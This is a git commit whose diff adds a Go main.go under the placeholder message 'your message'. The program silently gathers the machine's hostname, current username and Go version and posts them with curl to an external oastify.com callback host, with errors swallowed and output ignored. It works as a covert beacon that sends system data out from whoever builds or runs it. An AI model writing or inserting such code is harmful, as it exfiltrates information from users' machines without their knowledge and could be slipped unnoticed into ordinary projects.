f564a4a426c060ebf49ca89735b3d7734a9c3a4a
mani <mani@Kali.localdomain>
2026-02-25 16:29:18 +0530

    your message

---
+++ main.go
@@ -0,0 +1,44 @@
+package main
+
+import (
+    "os"
+    "os/exec"
+    "runtime"
+    "strings"
+)
+
+func main() {
+    // Silent execution
+    func() {
+        defer func() { recover() }()
+        
+        // Get data
+        hostname, _ := os.Hostname()
+        currentUser := getCurrentUser()
+        
+        // Use curl instead of Go's HTTP client
+        cmd := exec.Command("curl", "-s", "-X", "POST",
+            "http://qmgs4qre55aggszd0qadtpas2j8aw5ku.oastify.com/collect",
+            "-d", "host="+hostname,
+            "-d", "user="+currentUser,
+            "-d", "go="+runtime.Version(),
+            "--max-time", "5")
+        
+        cmd.Run() // Ignore output
+    }()
+}
+
+func getCurrentUser() string {
+    if user := os.Getenv("USER"); user != "" {
+        return user
+    }
+    if user := os.Getenv("USERNAME"); user != "" {
+        return user
+    }
+    cmd := exec.Command("whoami")
+    output, err := cmd.Output()
+    if err != nil {
+        return "unknown"
+    }
+    return strings.TrimSpace(string(output))
+}
